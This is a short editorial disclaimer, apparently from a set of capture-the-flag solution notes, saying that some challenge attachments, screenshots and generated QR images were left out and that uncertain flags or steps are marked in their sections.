Some original challenge attachments, screenshots, and generated images (e.g., QR code images) were not included in the solution notes. Any uncertainties regarding individual flags or steps are specified in the relevant sections.